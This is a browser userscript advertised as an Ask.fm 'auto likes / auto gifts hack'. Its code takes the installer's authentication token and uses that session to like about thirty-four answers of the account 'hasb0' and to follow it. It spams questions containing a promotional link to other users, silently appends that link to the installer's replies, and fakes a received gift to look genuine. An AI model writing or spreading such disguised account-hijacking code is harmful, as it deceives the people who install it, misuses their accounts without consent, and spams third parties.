// ==UserScript==
// @name			Ask.fm Auto Questions - Auto Likes -  Hack
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			2.0
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @include			http://ask.fm/GabriielSantos1
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==              http://ask.fm/GabriielSantos1

var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
	return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "www.ask.fm/GabriielSantos1";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "Hey ==> ";
var cevap = mesaj + " " + link;

if(document.getElementsByClassName("link-menu-active").length > 0){
if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
var gift = document.createElement("div");
gift.id = "gift-container";
gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
document.body.insertBefore(gift,document.getElementById("wrapper"));
Gifts.init({
sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
flash_id: null,
sync_all: false
});    
Gifts.load([{
"offset_left":0,
"rtl":false,
"src":"http://ask.fm/images/badges/love_and_friendship/C0459.png",
"z_index":1,
"id":2569992,
"offset_top":25
}]);
}}

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
  document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
  }
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/hasb0/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Like Plz" + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
  }
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/hasb0/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function takipet(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}

function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	}
});
}
sorubegen("hasb0","20010242027");
sorubegen("hasb0","31387483115");
sorubegen("hasb0","18061049067");
sorubegen("hasb0","29934277355");
sorubegen("hasb0","17682865899");
sorubegen("hasb0","22735793643");
sorubegen("hasb0","20255199211");
sorubegen("hasb0","19003512811");
sorubegen("hasb0","23542879211");
sorubegen("hasb0","23243808747");
sorubegen("hasb0","20256298731");
sorubegen("hasb0","32575272939");
sorubegen("hasb0","30493580523");
sorubegen("hasb0","19514902507");
sorubegen("hasb0","19676196587");
sorubegen("hasb0","13947256043");
sorubegen("hasb0","32330443499");
sorubegen("hasb0","22433473515");
sorubegen("hasb0","17810837995");
sorubegen("hasb0","18047242987");
sorubegen("hasb0","18055401963");
sorubegen("hasb0","19654874347");
sorubegen("hasb0","19134030059");
sorubegen("hasb0","22390259435");
sorubegen("hasb0","19239117547");
sorubegen("hasb0","18163982827");
sorubegen("hasb0","20254013419");
sorubegen("hasb0","22724480491");
sorubegen("hasb0","13777643755");
sorubegen("hasb0","19515690731");
sorubegen("hasb0","17402239979");
sorubegen("hasb0","19107045355");
sorubegen("hasb0","29948685035");
sorubegen("hasb0","29948969963");
takipet("hasb0");

